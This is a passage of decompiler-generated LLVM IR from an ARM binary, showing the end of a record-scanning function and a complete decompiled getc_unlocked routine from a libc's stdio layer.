  store i1 %v2_1714c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1714c, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_17148
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_17148, %bb225
  %v1_17198 = phi i32 [ %v4_17148, %dec_label_pc_17148 ], [ 1, %bb225 ]
  %v2_17154 = sub i32 %v2_1713c, %v1_17198
  store i32 %v2_17154, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1715c = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_1715c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17160 = icmp slt i32 %v2_17154, 0
  store i1 %v1_17160, i1* %cpsr_n.global-to-local, align 1
  %v2_17160 = icmp eq i32 %v2_17154, 0
  store i1 %v2_17160, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_17154, 1
  br i1 %tmp227, label %dec_label_pc_171c0, label %dec_label_pc_17174

dec_label_pc_17174:                               ; preds = %bb226
  %v0_17174 = load i32, i32* %fp.global-to-local, align 4
  %v1_17174 = add i32 %v0_17174, 12
  %v2_17174 = inttoptr i32 %v1_17174 to i32*
  %v3_17174 = load i32, i32* %v2_17174, align 4
  store i32 %v3_17174, i32* %r3.global-to-local, align 4
  %v1_17178 = and i32 %v3_17174, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17178 = icmp eq i32 %v1_17178, 0
  store i1 %v2_17178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17178, label %dec_label_pc_17190, label %dec_label_pc_17180

dec_label_pc_17180:                               ; preds = %dec_label_pc_17174
  store i32 ptrtoint (i32* @global_var_2420b.1273 to i32), i32* %r3.global-to-local, align 4
  %v1_17184 = add i32 %v1_17138.pre, 12
  store i32 %v1_17184, i32* %r5.global-to-local, align 4
  %v1_17188 = inttoptr i32 %v1_17138.pre to i32*
  store i32 160, i32* %v1_17188, align 4
  %v3_17188 = add i32 %v1_17138.pre, 4
  %v4_17188 = inttoptr i32 %v3_17188 to i32*
  %v5_17188 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17188, i32* %v4_17188, align 4
  %v6_17188 = add i32 %v1_17138.pre, 8
  %v7_17188 = inttoptr i32 %v6_17188 to i32*
  %v8_17188 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_17188, i32* %v7_17188, align 4
  br label %dec_label_pc_171c4

dec_label_pc_17190:                               ; preds = %dec_label_pc_17174
  %v1_17190 = add i32 %v0_17174, 16
  %v2_17190 = inttoptr i32 %v1_17190 to i32*
  %v3_17190 = load i32, i32* %v2_17190, align 4
  store i32 %v3_17190, i32* %r3.global-to-local, align 4
  %v1_17194 = add i32 %v3_17190, -48
  %v3_17194 = sub i32 47, %v3_17190
  %v4_17194 = and i32 %v3_17194, %v3_17190
  %v5_17194 = icmp slt i32 %v4_17194, 0
  store i1 %v5_17194, i1* %cpsr_v.global-to-local, align 1
  %v6_17194 = icmp slt i32 %v1_17194, 0
  store i1 %v6_17194, i1* %cpsr_n.global-to-local, align 1
  %v7_17194 = icmp eq i32 %v3_17190, 48
  store i1 %v7_17194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17194, label %dec_label_pc_171a4, label %bb228

bb228:                                            ; preds = %dec_label_pc_17190
  store i32 %v2_1713c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_171c0

dec_label_pc_171a4:                               ; preds = %dec_label_pc_17190
  %v3_171a4 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_17138.pre, i32* %r5.global-to-local, align 4
  %v2_171ac = add i32 %v3_171a4, %v2_17154
  store i32 %v2_171ac, i32* %r3.global-to-local, align 4
  store i32 %v2_171ac, i32* %stack_var_-168, align 4
  br label %dec_label_pc_171c4

dec_label_pc_171b8:                               ; preds = %dec_label_pc_171cc
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_171fc

dec_label_pc_171c0:                               ; preds = %bb228, %bb226
  store i32 %v1_17138.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_171c4

dec_label_pc_171c4:                               ; preds = %dec_label_pc_171a4, %dec_label_pc_17180, %dec_label_pc_171c0
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_16bb8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_171cc

dec_label_pc_171cc:                               ; preds = %dec_label_pc_171f4, %dec_label_pc_171c4
  %v0_171cc = phi i32 [ %v1_171ec, %dec_label_pc_171f4 ], [ %v2_16bb8, %dec_label_pc_171c4 ]
  %v1_171cc = inttoptr i32 %v0_171cc to i32*
  %v2_171cc = load i32, i32* %v1_171cc, align 4
  store i32 %v2_171cc, i32* %r1.global-to-local, align 4
  %v3_171cc = add i32 %v0_171cc, 4
  %v4_171cc = inttoptr i32 %v3_171cc to i32*
  %v5_171cc = load i32, i32* %v4_171cc, align 4
  store i32 %v5_171cc, i32* %r2.global-to-local, align 4
  %v6_171cc = add i32 %v0_171cc, 8
  %v7_171cc = inttoptr i32 %v6_171cc to i32*
  %v8_171cc = load i32, i32* %v7_171cc, align 4
  store i32 %v8_171cc, i32* %r3.global-to-local, align 4
  %v2_171d0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_171d0, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* %ip.global-to-local, align 4
  store i32 94688, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_171e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_171e0 = add i32 %v0_171e0, 4
  %v2_171e0 = inttoptr i32 %v1_171e0 to i32*
  %v3_171e0 = load i32, i32* %v2_171e0, align 4
  store i32 %v3_171e0, i32* %r3.global-to-local, align 4
  %v0_171e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_171e4 = sub i32 %v0_171e4, %v3_171e0
  %v4_171e4 = xor i32 %v0_171e4, %v3_171e0
  %v5_171e4 = xor i32 %v2_171e4, %v0_171e4
  %v6_171e4 = and i32 %v5_171e4, %v4_171e4
  %v7_171e4 = icmp slt i32 %v6_171e4, 0
  store i1 %v7_171e4, i1* %cpsr_v.global-to-local, align 1
  %v8_171e4 = icmp slt i32 %v2_171e4, 0
  store i1 %v8_171e4, i1* %cpsr_n.global-to-local, align 1
  %v9_171e4 = icmp eq i32 %v0_171e4, %v3_171e0
  store i1 %v9_171e4, i1* %cpsr_z.global-to-local, align 1
  %v0_171e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_171e8 = add i32 %v0_171e8, %v0_171e4
  store i32 %v2_171e8, i32* %r6.global-to-local, align 4
  %v1_171ec = add i32 %v0_171e0, 12
  store i32 %v1_171ec, i32* %r4.global-to-local, align 4
  br i1 %v9_171e4, label %dec_label_pc_171f4, label %dec_label_pc_171b8

dec_label_pc_171f4:                               ; preds = %dec_label_pc_171cc
  %v1_171f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_171f4 = sub i32 %v1_171ec, %v1_171f4
  %v3_171f4 = icmp ult i32 %v1_171ec, %v1_171f4
  %v4_171f4 = xor i32 %v1_171f4, %v1_171ec
  %v5_171f4 = xor i32 %v2_171f4, %v1_171ec
  %v6_171f4 = and i32 %v5_171f4, %v4_171f4
  %v7_171f4 = icmp slt i32 %v6_171f4, 0
  store i1 %v7_171f4, i1* %cpsr_v.global-to-local, align 1
  %v8_171f4 = icmp slt i32 %v2_171f4, 0
  store i1 %v8_171f4, i1* %cpsr_n.global-to-local, align 1
  %v9_171f4 = icmp eq i32 %v1_171ec, %v1_171f4
  store i1 %v9_171f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_171f4, label %dec_label_pc_171cc, label %dec_label_pc_171fc

dec_label_pc_171fc:                               ; preds = %dec_label_pc_171f4, %dec_label_pc_171b8
  %v0_171fc = phi i32 [ -1, %dec_label_pc_171b8 ], [ %v2_171e8, %dec_label_pc_171f4 ]
  store i32 %v0_171fc, i32* %r0.global-to-local, align 4
  %v8_17208 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_17208, i32* @r6, align 4
  store i32 %v6_16ba4, i32* @r7, align 4
  store i32 %v9_16ba4, i32* @r8, align 4
  store i32 %v12_16ba4, i32* @sb, align 4
  store i32 %v15_16ba4, i32* @sl, align 4
  store i32 %v18_16ba4, i32* @fp, align 4
  ret i32 %v0_171fc

; uselistorder directives
  uselistorder i32 %v0_171fc, { 1, 0 }
  uselistorder i32 %v2_171f4, { 1, 0 }
  uselistorder i32 %v1_171f4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_171ec, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_171e4, { 1, 0 }
  uselistorder i32 %v0_171e4, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_171e0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_171cc, { 2, 1, 0 }
  uselistorder i32 %v3_17190, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1713c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_17130, { 1, 2, 0 }
  uselistorder i32 %v0_17130, { 1, 0 }
  uselistorder i32 %v1_17138.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_170f0, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_170ec, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_170b0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_170a4, { 3, 0, 1, 2 }
  uselistorder i32 %v2_17080, { 1, 0 }
  uselistorder i32 %v1_17080, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1707c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_17074, { 1, 0 }
  uselistorder i32 %v0_1706c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_17054, { 1, 0 }
  uselistorder i32 %v1_17030, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17030, { 1, 0, 2 }
  uselistorder i32 %v1_1700c, { 0, 2, 1 }
  uselistorder i32 %v0_17008, { 3, 0, 1, 2 }
  uselistorder i1 %v2_16fec, { 2, 1, 0 }
  uselistorder i32 %v2_16f44, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_16f34, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_16fd8, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_16ee0, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_16ec8, { 1, 0 }
  uselistorder i32 %v2_16ec0, { 1, 2, 0 }
  uselistorder i32 %v1_16eb4, { 1, 0 }
  uselistorder i32 %v0_16eb4, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_16eac, { 1, 0, 2 }
  uselistorder i32 %v0_16ea4, { 3, 0, 1, 2 }
  uselistorder i1 %v3_16e88, { 1, 0 }
  uselistorder i32 %v2_16e88, { 1, 0 }
  uselistorder i32 %v2_16e84, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_16e70, { 1, 0 }
  uselistorder i32 %v1_16e74, { 2, 1, 0 }
  uselistorder i1 %v2_16e64, { 1, 0 }
  uselistorder i32 %v0_16e60, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_16e48, { 1, 0 }
  uselistorder i32 %v1_16e3c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_16df4, { 1, 2, 0 }
  uselistorder i32 %v2_16df0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_16df0, { 1, 0, 2 }
  uselistorder i1 %v2_16ddc, { 1, 0 }
  uselistorder i32 %v0_16dd4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_16de4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_16dc4, { 1, 0 }
  uselistorder i32 %v0_16db4, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_16dac, { 1, 0 }
  uselistorder i1 %v5_16dac, { 1, 0 }
  uselistorder i32 %v0_16da8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_16d9c, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_16d98, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_16d4c, { 1, 0 }
  uselistorder i32 %v3_16d4c, { 1, 0 }
  uselistorder i32 %v0_16c80, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_16bb8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_16bb4, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 4, 3, 5, 0, 6, 7, 8, 9 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 12, 9, 4, 10, 11, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23, 24, 25, 43, 26, 27, 31, 28, 29, 30, 32, 1, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 46, 44, 45, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 2, 7, 8, 16, 19, 15, 17, 9, 10, 18, 11, 12, 13, 20, 14, 1, 21, 22, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 11, 9, 10, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 1, 29, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51 }
  uselistorder i1* %cpsr_v.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 29, 30, 31, 45, 32, 33, 34, 35, 36, 37, 38, 44, 39, 40, 41, 42, 43, 46, 47, 48 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 2, 21, 22, 23, 24, 25, 26, 27, 28, 29, 1, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51 }
  uselistorder i32 47, { 1, 2, 0 }
  uselistorder i32 112, { 2, 4, 0, 5, 3, 1, 6, 7 }
  uselistorder i32 176, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 17, { 7, 0, 9, 10, 1, 11, 12, 2, 13, 3, 14, 4, 15, 5, 16, 24, 8, 17, 18, 19, 6, 20, 21, 22, 23 }
  uselistorder i32 102, { 3, 0, 1, 4, 5, 2, 6, 7 }
  uselistorder i8 69, { 1, 0 }
  uselistorder i32 96, { 1, 2, 0, 3 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder label %dec_label_pc_171c4, { 2, 0, 1 }
  uselistorder label %bb226, { 1, 0 }
  uselistorder label %dec_label_pc_1712c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_170a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1707c, { 1, 0 }
  uselistorder label %.thread42, { 1, 0 }
  uselistorder label %dec_label_pc_17054, { 1, 0 }
  uselistorder label %dec_label_pc_17030, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17014, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16fe8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16fe4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16f08, { 1, 0 }
  uselistorder label %bb212, { 1, 0 }
  uselistorder label %dec_label_pc_16ef8, { 1, 0 }
  uselistorder label %dec_label_pc_16eec, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb202, { 1, 0 }
  uselistorder label %bb200, { 1, 0 }
  uselistorder label %.preheader, { 3, 2, 1, 0 }
  uselistorder label %bb197, { 1, 0 }
  uselistorder label %dec_label_pc_16e14, { 2, 0, 1 }
  uselistorder label %bb194, { 2, 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb187, { 1, 0 }
  uselistorder label %.thread105, { 1, 0 }
  uselistorder label %bb184, { 1, 0 }
  uselistorder label %bb182, { 1, 0 }
  uselistorder label %bb180, { 1, 0 }
}

define i32 @getc_unlocked(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-9 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_1720c = load i32, i32* @r4, align 4
  store i32 %v3_1720c, i32* %stack_var_-8, align 4
  %v0_17210 = load i32, i32* @r0, align 4
  %v1_17210 = add i32 %v0_17210, 16
  %v2_17210 = inttoptr i32 %v1_17210 to i32*
  %v3_17210 = load i32, i32* %v2_17210, align 4
  store i32 %v3_17210, i32* %r2.global-to-local, align 4
  %v1_17214 = add i32 %v0_17210, 24
  %v2_17214 = inttoptr i32 %v1_17214 to i32*
  %v3_17214 = load i32, i32* %v2_17214, align 4
  %v3_17218 = icmp ult i32 %v3_17210, %v3_17214
  store i32 %v0_17210, i32* @r4, align 4
  br i1 %v3_17218, label %bb, label %dec_label_pc_17230

bb:                                               ; preds = %entry
  %v2_17220 = inttoptr i32 %v3_17210 to i8*
  %v3_17220 = load i8, i8* %v2_17220, align 1
  %v4_17220 = zext i8 %v3_17220 to i32
  store i32 %v4_17220, i32* %r0.global-to-local, align 4
  %v6_17220 = add i32 %v3_17210, 1
  store i32 %v6_17220, i32* %r2.global-to-local, align 4
  store i32 %v6_17220, i32* %v2_17210, align 4
  br label %dec_label_pc_17330

dec_label_pc_17230:                               ; preds = %entry
  %v1_17230 = inttoptr i32 %v0_17210 to i8*
  %v2_17230 = load i8, i8* %v1_17230, align 1
  %v3_17230 = zext i8 %v2_17230 to i32
  %v1_17234 = and i32 %v3_17230, 131
  %tmp22 = icmp ugt i32 %v1_17234, 128
  br i1 %tmp22, label %dec_label_pc_17250, label %dec_label_pc_17240

dec_label_pc_17240:                               ; preds = %dec_label_pc_17230
  store i32 128, i32* @r1, align 4
  %v0_17244 = call i32 @__stdio_trans2r_o()
  store i32 %v0_17244, i32* %r0.global-to-local, align 4
  %v2_17248 = icmp eq i32 %v0_17244, 0
  br i1 %v2_17248, label %dec_label_pc_17240.dec_label_pc_17250_crit_edge, label %dec_label_pc_1732c

dec_label_pc_17240.dec_label_pc_17250_crit_edge:  ; preds = %dec_label_pc_17240
  %v0_17250.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17250

dec_label_pc_17250:                               ; preds = %dec_label_pc_17240.dec_label_pc_17250_crit_edge, %dec_label_pc_17230
  %v2_1729c = phi i32 [ %v0_17250.pre, %dec_label_pc_17240.dec_label_pc_17250_crit_edge ], [ %v0_17210, %dec_label_pc_17230 ]
  %v1_17250 = inttoptr i32 %v2_1729c to i8*
  %v2_17250 = load i8, i8* %v1_17250, align 1
  %v3_17250 = zext i8 %v2_17250 to i32
  store i32 %v3_17250, i32* %r2.global-to-local, align 4
  %v1_17254 = add i32 %v2_1729c, 1
  %v2_17254 = inttoptr i32 %v1_17254 to i8*
  %v3_17254 = load i8, i8* %v2_17254, align 1
  %v4_17254 = zext i8 %v3_17254 to i32
  %v4_17258 = mul nuw nsw i32 %v4_17254, 256
  %v5_17258 = or i32 %v4_17258, %v3_17250
  store i32 %v5_17258, i32* %r2.global-to-local, align 4
  %v1_1725c = and i32 %v3_17250, 2
  %v2_1725c = icmp eq i32 %v1_1725c, 0
  br i1 %v2_1725c, label %dec_label_pc_1728c, label %dec_label_pc_17264

dec_label_pc_17264:                               ; preds = %dec_label_pc_17250
  %tmp23 = urem i8 %v2_17250, 2
  %v1_17264 = zext i8 %tmp23 to i32
  %tmp18 = sub nsw i32 0, %v1_17264
  %v4_17268 = and i32 %tmp18, 4
  %v5_17268 = add i32 %v4_17268, %v2_1729c
  %v1_1726c = add i32 %v5_17268, 36
  %v2_1726c = inttoptr i32 %v1_1726c to i8*
  %v3_1726c = load i8, i8* %v2_1726c, align 1
  %v4_1726c = zext i8 %v3_1726c to i32
  %v1_17270 = add nsw i32 %v5_17258, -1
  store i32 %v1_17270, i32* %r2.global-to-local, align 4
  %v3_17274 = sdiv i32 %v1_17270, 256
  store i32 %v3_17274, i32* %r1.global-to-local, align 4
  store i32 %v4_1726c, i32* %r0.global-to-local, align 4
  %v2_17280 = add i32 %v2_1729c, 40
  %v3_17280 = inttoptr i32 %v2_17280 to i32*
  store i32 0, i32* %v3_17280, align 4
  %v0_17284 = load i32, i32* %r1.global-to-local, align 4
  %v1_17284 = trunc i32 %v0_17284 to i8
  %v2_17284 = load i32, i32* @r4, align 4
  %v3_17284 = add i32 %v2_17284, 1
  %v4_17284 = inttoptr i32 %v3_17284 to i8*
  store i8 %v1_17284, i8* %v4_17284, align 1
  br label %dec_label_pc_172c0

dec_label_pc_1728c:                               ; preds = %dec_label_pc_17250
  %v1_1728c = add i32 %v2_1729c, 16
  store i32 %v1_1728c, i32* %r1.global-to-local, align 4
  %v1_17290 = inttoptr i32 %v1_1728c to i32*
  %v2_17290 = load i32, i32* %v1_17290, align 4
  store i32 %v2_17290, i32* %r1.global-to-local, align 4
  %v3_17290 = add i32 %v2_1729c, 20
  %v4_17290 = inttoptr i32 %v3_17290 to i32*
  %v5_17290 = load i32, i32* %v4_17290, align 4
  %v9_17294 = icmp eq i32 %v5_17290, %v2_17290
  br i1 %v9_17294, label %dec_label_pc_172a4, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1728c
  %v2_17298 = inttoptr i32 %v2_17290 to i8*
  %v3_17298 = load i8, i8* %v2_17298, align 1
  %v4_17298 = zext i8 %v3_17298 to i32
  store i32 %v4_17298, i32* %r0.global-to-local, align 4
  %v6_17298 = add i32 %v2_17290, 1
  store i32 %v6_17298, i32* %r1.global-to-local, align 4
  store i32 %v6_17298, i32* %v1_17290, align 4
  br label %dec_label_pc_17330

dec_label_pc_172a4:                               ; preds = %dec_label_pc_1728c
  %v1_172a4 = add i32 %v2_1729c, 4
  %v2_172a4 = inttoptr i32 %v1_172a4 to i32*
  %v3_172a4 = load i32, i32* %v2_172a4, align 4
  %v4_172ac = icmp eq i32 %v3_172a4, -2
  br i1 %v4_172ac, label %dec_label_pc_172b0, label %dec_label_pc_172c8

dec_label_pc_172b0:                               ; preds = %dec_label_pc_172a4
  %v1_172b0 = or i32 %v5_17258, 4
  store i32 %v1_172b0, i32* %r2.global-to-local, align 4
  store i8 %v3_17254, i8* %v2_17254, align 1
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_172c0

dec_label_pc_172c0:                               ; preds = %dec_label_pc_17264, %dec_label_pc_172b0
  %v0_172c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_172c0 = trunc i32 %v0_172c0 to i8
  %v2_172c0 = load i32, i32* @r4, align 4
  %v3_172c0 = inttoptr i32 %v2_172c0 to i8*
  store i8 %v1_172c0, i8* %v3_172c0, align 1
  br label %dec_label_pc_17330

dec_label_pc_172c8:                               ; preds = %dec_label_pc_172a4
  %v1_172c8 = and i32 %v4_17258, 768
  %v2_172c8 = icmp eq i32 %v1_172c8, 0
  br i1 %v2_172c8, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_172c8
  store i32 ptrtoint (i32** @global_var_2c5ac.1025 to i32), i32* %r0.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_172c8, %bb19
  store i32 94932, i32* @lr, align 4
  %v1_172d0 = xor i1 %v2_172c8, true
  call void @__pseudo_cond_branch(i1 %v1_172d0, i32 ptrtoint (i32* @global_var_13aa0.1277 to i32))
  %v0_172d4 = load i32, i32* @r4, align 4
  %v1_172d4 = add i32 %v0_172d4, 8
  store i32 %v1_172d4, i32* %r2.global-to-local, align 4
  %v1_172d8 = inttoptr i32 %v1_172d4 to i32*
  %v2_172d8 = load i32, i32* %v1_172d8, align 4
  store i32 %v2_172d8, i32* %r2.global-to-local, align 4
  %v3_172d8 = add i32 %v0_172d4, 12
  %v4_172d8 = inttoptr i32 %v3_172d8 to i32*
  %v5_172d8 = load i32, i32* %v4_172d8, align 4
  %v9_172dc = icmp eq i32 %v5_172d8, %v2_172d8
  br i1 %v9_172dc, label %dec_label_pc_17310, label %dec_label_pc_172e4

dec_label_pc_172e4:                               ; preds = %bb20
  %v2_172e4 = add i32 %v0_172d4, 24
  %v3_172e4 = inttoptr i32 %v2_172e4 to i32*
  store i32 %v2_172d8, i32* %v3_172e4, align 4
  %v0_172e8 = load i32, i32* @r4, align 4
  store i32 %v0_172e8, i32* %r0.global-to-local, align 4
  %v2_172ec = call i32 @__stdio_rfill(i32 %v0_172e8)
  store i32 %v2_172ec, i32* %r0.global-to-local, align 4
  %v2_172f0 = icmp eq i32 %v2_172ec, 0
  br i1 %v2_172f0, label %dec_label_pc_1732c, label %dec_label_pc_172f8

dec_label_pc_172f8:                               ; preds = %dec_label_pc_172e4
  %v0_172f8 = load i32, i32* @r4, align 4
  %v1_172f8 = add i32 %v0_172f8, 20
  %v2_172f8 = inttoptr i32 %v1_172f8 to i32*
  %v3_172f8 = load i32, i32* %v2_172f8, align 4
  %v2_172fc = add i32 %v0_172f8, 24
  %v3_172fc = inttoptr i32 %v2_172fc to i32*
  store i32 %v3_172f8, i32* %v3_172fc, align 4
  %v0_17300 = load i32, i32* @r4, align 4
  %v1_17300 = add i32 %v0_17300, 16
  %v2_17300 = inttoptr i32 %v1_17300 to i32*
  %v3_17300 = load i32, i32* %v2_17300, align 4
  %v1_17304 = inttoptr i32 %v3_17300 to i8*
  %v2_17304 = load i8, i8* %v1_17304, align 1
  %v3_17304 = zext i8 %v2_17304 to i32
  store i32 %v3_17304, i32* %r0.global-to-local, align 4
  %v5_17304 = add i32 %v3_17300, 1
  store i32 %v5_17304, i32* %v2_17300, align 4
  br label %dec_label_pc_17330

dec_label_pc_17310:                               ; preds = %bb20
  %v1_17310 = inttoptr i32 %v0_172d4 to i8*
  store i32 %v0_172d4, i32* %r0.global-to-local, align 4
  %v2_17314 = ptrtoint i8* %stack_var_-9 to i32
  store i32 %v2_17314, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1731c = call i32 @__stdio_READ(i8* %v1_17310, i32 %v2_17314, i32 1)
  store i32 %v5_1731c, i32* %r0.global-to-local, align 4
  %v2_17320 = icmp eq i32 %v5_1731c, 0
  br i1 %v2_17320, label %dec_label_pc_1732c, label %bb21

bb21:                                             ; preds = %dec_label_pc_17310
  %v4_17324 = load i8, i8* %stack_var_-9, align 1
  %v5_17324 = sext i8 %v4_17324 to i32
  store i32 %v5_17324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17330

dec_label_pc_1732c:                               ; preds = %dec_label_pc_17310, %dec_label_pc_17240, %dec_label_pc_172e4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17330

dec_label_pc_17330:                               ; preds = %bb, %bb21, %.thread4, %dec_label_pc_172f8, %dec_label_pc_172c0, %dec_label_pc_1732c
  %v2_17334 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17334, i32* @r4, align 4
  %v8_17334 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_17334

; uselistorder directives
  uselistorder i32 %v2_17290, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17250, { 1, 0, 2 }
  uselistorder i32 %v2_1729c, { 1, 3, 2, 4, 0, 6, 5 }
  uselistorder i32 %v3_17210, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-9, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
